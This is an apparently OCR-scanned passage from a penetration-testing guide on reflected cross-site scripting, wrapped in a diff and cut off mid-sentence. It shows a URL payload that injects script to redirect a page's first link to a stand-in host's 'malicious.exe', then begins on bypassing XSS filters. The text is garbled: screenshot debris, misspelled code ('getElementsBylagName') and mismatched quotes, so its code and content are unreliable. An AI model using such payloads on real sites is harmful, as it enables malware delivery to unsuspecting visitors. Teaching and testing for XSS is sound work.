@@ -1,0 +1,39 @@
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+This indicates that there is an XSS vulnerability and it appears that
+the tester can execute code of his choice in anybody's browser if
+he clicks on the tester’s link.
+Example 2
+Let's try other piece of code (link):
+http:/example.com/index.php?user=<script>window.
+onload = function() {var AllLinks=document.
+getElementsBylagName(“a’);
+AllLinks[0].href = “http:/badexample.com/malicious.exe”; }</
+script>
+This produces the following behavior:
+MSS
+festease #1 - Mozilla Firefox
+Ble
+Edit
+View
+History
+Bookmarks
+Tools
+Help
+|
+http example. comindex. php ?usere<script>window. anlo
+Welcome
+Get terminal client !
+http: //badexample.com/malicious.exe
+This will cause the user, clicking on the link supplied by the tester,
+to download the file malicious.exe from a site he controls.
+Bypass XSS filters
+Reflected cross-site scripting attacks are prevented as the web
+application sanitizes input, a web application firewall blocks
+malicious input, or by mechanisms embedded in modern web
+browsers. The tester must test for vulnerabilities assuming that
+web browsers will not prevent the attack. Browsers may be out
+of date, or have built-in securi
